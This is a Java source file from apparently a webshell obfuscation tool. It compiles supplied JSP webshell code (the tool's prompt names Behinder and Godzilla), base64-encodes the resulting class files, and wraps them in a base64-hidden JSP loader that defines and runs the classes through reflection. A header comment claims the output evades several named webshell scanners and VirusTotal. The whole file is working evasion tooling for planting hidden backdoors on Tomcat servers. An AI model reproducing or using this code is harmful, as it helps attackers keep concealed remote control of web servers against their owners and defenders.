package encode;

import application.RandomString;
import org.apache.jasper.JspC;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class JspEncodeDemo1 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;
    String demotxt;

    public JspEncodeDemo1() {
    }

    public JspEncodeDemo1(String tamplate, String key, String code) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = code;
    }

    public static String GetDemotxt(){

        return "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-11-24_jspdemo1\n" +
                " * Bypass: 河马在线、河马本地(1.8.2)、D盾(2.1.7)、WEBDIR+、微步(安全)、VT(0红)、\n" +
                " * 适配: tomcat7.0.x、tomcat8.x\n" +
                " * java6 <= java版本 <= java8\n" +
                " */";
    }

    public String[] Run() throws Exception {

        if(!sourcecode.isEmpty()){
            try {

                if(this.key.equals("默认随机")){
                    this.key = "x"+RandomString.getRString(8);
                }

                String filename = this.key+".jsp";
                File file = new File("./cache/");
                file.mkdir();
                FileOutputStream fileOutputStream = new FileOutputStream("./cache/"+filename);
                fileOutputStream.write(this.sourcecode.getBytes(StandardCharsets.UTF_8));

                JspC jspc = new JspC();
                jspc.setUriroot("./cache/");
                jspc.setOutputDir("./cache/");
                jspc.setJspFiles(filename);
                jspc.setCompile(true);
                jspc.execute();

                File file2 = new File("./cache/org/apache/jsp/");
                File[] list = file2.listFiles();
                String jspsource = "";
                for (File f : list) {
                    if (f.getName().contains(".class")) {
                        FileInputStream fileInputStream = new FileInputStream(f.getPath());
                        byte[] buffer = new byte[(int) f.length()];
                        fileInputStream.read(buffer);
                        String s = Base64.getEncoder().encodeToString(buffer);
                        String[] split = f.getName().split("\\.");
                        String demo1 = "U3RyaW5nICRjbGFzc25hbWUkID0gIiRjbGFzc2Jhc2U2NCQiO21hcC5wdXQoIiRjbGFzc25hbWUkIiwgJGNsYXNzbmFtZSQpOw==";
                        String base64class = new String(Base64.getDecoder().decode(demo1));
                        base64class = base64class.replace("$classname$",split[0]);
                        base64class = base64class.replace("$classbase64$",s);
                        jspsource +=base64class;
                    }
                }

                String demo = "PCVAIHBhZ2UgbGFuZ3VhZ2U9ImphdmEiIHBhZ2VFbmNvZGluZz0iVVRGLTgiICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS51dGlsLioiICU+CjwlQCBwYWdlIGltcG9ydD0ib3JnLmFwYWNoZS5qYXNwZXIuc2VydmxldC5Kc3BTZXJ2bGV0IiAlPgo8JUAgcGFnZSBpbXBvcnQ9Im9yZy5hcGFjaGUuamFzcGVyLnJ1bnRpbWUuSHR0cEpzcEJhc2UiICU+CjwlQCBwYWdlIGltcG9ydD0ib3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLlN0YW5kYXJkV3JhcHBlckZhY2FkZSIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuU3RhbmRhcmRXcmFwcGVyIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEuaW8uSU9FeGNlcHRpb24iICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS5pby5PdXRwdXRTdHJlYW0iICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS5pby5QdXNoYmFja0lucHV0U3RyZWFtIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEubGFuZy5yZWZsZWN0LkZpZWxkIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmxhbmcucmVmbGVjdC5BY2Nlc3NpYmxlT2JqZWN0IiAlPgo8JUAgcGFnZSBpbXBvcnQ9InN1bi5taXNjLkNoYXJhY3RlckRlY29kZXIiICU+CjwlQCBwYWdlIGltcG9ydD0ic3VuLm1pc2MuQ0VGb3JtYXRFeGNlcHRpb24iICU+CjwlQCBwYWdlIGltcG9ydD0ic3VuLm1pc2MuQ0VTdHJlYW1FeGhhdXN0ZWQiICU+CgoKPCUhCiAgICBwdWJsaWMgc3RhdGljIGNsYXNzIEQgZXh0ZW5kcyBDaGFyYWN0ZXJEZWNvZGVyIHsKICAgICAgICBwcml2YXRlIHN0YXRpYyBmaW5hbCBjaGFyW10gcGVtX2FycmF5ID0gbmV3IGNoYXJbXXsnQScsICdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJywgJ2EnLCAnYicsICdjJywgJ2QnLCAnZScsICdmJywgJ2cnLCAnaCcsICdpJywgJ2onLCAnaycsICdsJywgJ20nLCAnbicsICdvJywgJ3AnLCAncScsICdyJywgJ3MnLCAndCcsICd1JywgJ3YnLCAndycsICd4JywgJ3knLCAneicsICcwJywgJzEnLCAnMicsICczJywgJzQnLCAnNScsICc2JywgJzcnLCAnOCcsICc5JywgJysnLCAnLyd9OwogICAgICAgIHByaXZhdGUgc3RhdGljIGZpbmFsIGJ5dGVbXSBwZW1fY29udmVydF9hcnJheSA9IG5ldyBieXRlWzI1Nl07CiAgICAgICAgYnl0ZVtdIGRlY29kZV9idWZmZXIgPSBuZXcgYnl0ZVs0XTsKICAgICAgICBwdWJsaWMgRCgpIHt9CiAgICAgICAgcHJvdGVjdGVkIGludCBieXRlc1BlckF0b20oKSB7CiAgICAgICAgICAgIHJldHVybiA0OwogICAgICAgIH0KICAgICAgICBwcm90ZWN0ZWQgaW50IGJ5dGVzUGVyTGluZSgpIHsKICAgICAgICAgICAgcmV0dXJuIDcyOwogICAgICAgIH0KICAgICAgICBwcm90ZWN0ZWQgdm9pZCBkZWNvZGVBdG9tKFB1c2hiYWNrSW5wdXRTdHJlYW0gdmFyMSwgT3V0cHV0U3RyZWFtIHZhcjIsIGludCB2YXIzKSB0aHJvd3MgSU9FeGNlcHRpb24gewogICAgICAgICAgICBieXRlIHZhcjUgPSAtMTsKICAgICAgICAgICAgYnl0ZSB2YXI2ID0gLTE7CiAgICAgICAgICAgIGJ5dGUgdmFyNyA9IC0xOwogICAgICAgICAgICBieXRlIHZhcjggPSAtMTsKICAgICAgICAgICAgaWYgKHZhcjMgPCAyKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgQ0VGb3JtYXRFeGNlcHRpb24oIkJBU0U2NERlY29kZXI6IE5vdCBlbm91Z2ggYnl0ZXMgZm9yIGFuIGF0b20uIik7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpbnQgdmFyNDsKICAgICAgICAgICAgICAgIGRvIHt2YXI0ID0gdmFyMS5yZWFkKCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHZhcjQgPT0gLTEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IENFU3RyZWFtRXhoYXVzdGVkKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSB3aGlsZSh2YXI0ID09IDEwIHx8IHZhcjQgPT0gMTMpOwogICAgICAgICAgICAgICAgdGhpcy5kZWNvZGVfYnVmZmVyWzBdID0gKGJ5dGUpdmFyNDsKICAgICAgICAgICAgICAgIHZhcjQgPSB0aGlzLnJlYWRGdWxseSh2YXIxLCB0aGlzLmRlY29kZV9idWZmZXIsIDEsIHZhcjMgLSAxKTsKICAgICAgICAgICAgICAgIGlmICh2YXI0ID09IC0xKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IENFU3RyZWFtRXhoYXVzdGVkKCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmICh2YXIzID4gMyAmJiB0aGlzLmRlY29kZV9idWZmZXJbM10gPT0gNjEpIHt2YXIzID0gMzt9CiAgICAgICAgICAgICAgICAgICAgaWYgKHZhcjMgPiAyICYmIHRoaXMuZGVjb2RlX2J1ZmZlclsyXSA9PSA2MSkge3ZhcjMgPSAyO30KICAgICAgICAgICAgICAgICAgICBzd2l0Y2godmFyMykgewogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXI4ID0gcGVtX2NvbnZlcnRfYXJyYXlbdGhpcy5kZWNvZGVfYnVmZmVyWzNdICYgMjU1XTsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyNyA9IHBlbV9jb252ZXJ0X2FycmF5W3RoaXMuZGVjb2RlX2J1ZmZlclsyXSAmIDI1NV07CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhcjYgPSBwZW1fY29udmVydF9hcnJheVt0aGlzLmRlY29kZV9idWZmZXJbMV0gJiAyNTVdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyNSA9IHBlbV9jb252ZXJ0X2FycmF5W3RoaXMuZGVjb2RlX2J1ZmZlclswXSAmIDI1NV07CiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2godmFyMykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNSA8PCAyICYgMjUyIHwgdmFyNiA+Pj4gNCAmIDMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI1IDw8IDIgJiAyNTIgfCB2YXI2ID4+PiA0ICYgMykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI2IDw8IDQgJiAyNDAgfCB2YXI3ID4+PiAyICYgMTUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI1IDw8IDIgJiAyNTIgfCB2YXI2ID4+PiA0ICYgMykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI2IDw8IDQgJiAyNDAgfCB2YXI3ID4+PiAyICYgMTUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNyA8PCA2ICYgMTkyIHwgdmFyOCAmIDYzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHN0YXRpYyB7CiAgICAgICAgICAgIGludCB2YXIwOwogICAgICAgICAgICBmb3IodmFyMCA9IDA7IHZhcjAgPCAyNTU7ICsrdmFyMCkge3BlbV9jb252ZXJ0X2FycmF5W3ZhcjBdID0gLTE7fQogICAgICAgICAgICBmb3IodmFyMCA9IDA7IHZhcjAgPCBwZW1fYXJyYXkubGVuZ3RoOyArK3ZhcjApIHtwZW1fY29udmVydF9hcnJheVtwZW1fYXJyYXlbdmFyMF1dID0gKGJ5dGUpdmFyMDt9CiAgICAgICAgfQogICAgfQolPgoKPCUhCiAgICBwdWJsaWMgY2xhc3MgSnNwQ2xhc3NMb2FkZXIgZXh0ZW5kcyBDbGFzc0xvYWRlciB7CgogICAgICAgIHB1YmxpYyBKc3BDbGFzc0xvYWRlcihDbGFzc0xvYWRlciBwYXJlbnQpIHsKICAgICAgICAgICAgc3VwZXIocGFyZW50KTsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBDbGFzczw/PiBmaW5kQ2xhc3MoU3RyaW5nIG5hbWUpIHsKCiAgICAgICAgICAgIE1hcDxTdHJpbmcsIFN0cmluZz4gbWFwID0gbmV3IEhhc2hNYXA8U3RyaW5nLCBTdHJpbmc+KCk7CgogICAgICAgICAgICAkYmFzZTY0Y29kZSQKICAgICAgICAgICAgCiAgICAgICAgICAgIFN0cmluZ1tdIHNwbGl0ID0gbmFtZS5zcGxpdCgiXFwuIik7CiAgICAgICAgICAgIGJ5dGVbXSBjbGFzc0J5dGVzID0gbnVsbDsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNsYXNzQnl0ZXMgPSBuZXcgRCgpLmRlY29kZUJ1ZmZlcihtYXAuZ2V0KHNwbGl0W3NwbGl0Lmxlbmd0aCAtIDFdKSk7CiAgICAgICAgICAgIH0gY2F0Y2ggKElPRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgTWV0aG9kIGRlbW9jbGFzcyA9IG51bGw7CiAgICAgICAgICAgIENsYXNzPD8+IGFDbGFzcyA9IG51bGw7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBkZW1vY2xhc3MgPSBDbGFzc0xvYWRlci5jbGFzcy5nZXREZWNsYXJlZE1ldGhvZCgiZGVmaW5lQ2xhc3MiLCBTdHJpbmcuY2xhc3MsIGJ5dGVbXS5jbGFzcywgaW50LmNsYXNzLCBpbnQuY2xhc3MpOwogICAgICAgICAgICAgICAgTWV0aG9kIHNldEFjY2Vzc2libGUgPSBBY2Nlc3NpYmxlT2JqZWN0LmNsYXNzLmdldE1ldGhvZCgic2V0QWNjZXNzaWJsZSIsIGJvb2xlYW4uY2xhc3MpOwogICAgICAgICAgICAgICAgc2V0QWNjZXNzaWJsZS5pbnZva2UoZGVtb2NsYXNzLHRydWUpOwogICAgICAgICAgICAgICAgYUNsYXNzID0gKENsYXNzPD8+KWRlbW9jbGFzcy4vKmEqLwogICAgICAgICAgICAgICAgICAgICAgICBpbnZva2UodGhpcywgbmFtZSwgY2xhc3NCeXRlcywgMCwgY2xhc3NCeXRlcy5sZW5ndGgpOwogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgZS5wcmludFN0YWNrVHJhY2UoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gYUNsYXNzOwogICAgICAgIH0KICAgIH0KJT4KCjwlCiAgICBKc3BTZXJ2bGV0IGpzcFNlcnZsZXQgPSBuZXcgSnNwU2VydmxldCgpOwogICAgSnNwQ2xhc3NMb2FkZXIganNwQ2xhc3NMb2FkZXIgPSBuZXcgSnNwQ2xhc3NMb2FkZXIoanNwU2VydmxldC5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpOwogICAgSHR0cEpzcEJhc2UgaHR0cEpzcEJhc2UgPSAoSHR0cEpzcEJhc2UpIGpzcENsYXNzTG9hZGVyLmZpbmRDbGFzcygib3JnLmFwYWNoZS5qc3AuJGtleSRfanNwIikuLyphKi8KICAgICAgICAgICAgbmV3SW5zdGFuY2UoKTsKICAgIFN0YW5kYXJkV3JhcHBlckZhY2FkZSBzdGFuZGFyZFdyYXBwZXJGYWNhZGUgPSBuZXcgU3RhbmRhcmRXcmFwcGVyRmFjYWRlKG5ldyBTdGFuZGFyZFdyYXBwZXIoKSk7CiAgICBGaWVsZCBjb25maWcxID0gc3RhbmRhcmRXcmFwcGVyRmFjYWRlLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgiY29uZmlnIik7CiAgICBjb25maWcxLnNldEFjY2Vzc2libGUodHJ1ZSk7CiAgICBjb25maWcxLnNldChzdGFuZGFyZFdyYXBwZXJGYWNhZGUsIHBhZ2VDb250ZXh0LmdldFNlcnZsZXRDb25maWcoKSk7CiAgICBGaWVsZCBjb250ZXh0ID0gc3RhbmRhcmRXcmFwcGVyRmFjYWRlLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgiY29udGV4dCIpOwogICAgY29udGV4dC5zZXRBY2Nlc3NpYmxlKHRydWUpOwogICAgY29udGV4dC5zZXQoc3RhbmRhcmRXcmFwcGVyRmFjYWRlLCBwYWdlQ29udGV4dC5nZXRTZXJ2bGV0Q29udGV4dCgpKTsKICAgIGh0dHBKc3BCYXNlLmluaXQoc3RhbmRhcmRXcmFwcGVyRmFjYWRlKTsKICAgIGh0dHBKc3BCYXNlLnNlcnZpY2UocmVxdWVzdCwgcmVzcG9uc2UpOwolPg==";
                encode = new String(Base64.getDecoder().decode(demo));

                encode = encode.replace("$key$",this.key);
                encode = encode.replace("$base64code$",jspsource);

                deleteDir("./cache/");

                return new String[]{this.encode,""};
            }catch (Exception e){
                deleteDir("./cache/");
                return new String[]{"加密失败",""};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉JSP源码",""};
        }
    }

    public static void deleteDir(String path) {
        File file = new File(path);
        File[] list = file.listFiles();
        for (File f : list) {
            if (f.isDirectory()) {
                deleteDir(f.getPath());
            } else {
                f.delete();
            }
        }
        file.delete();
    }
}
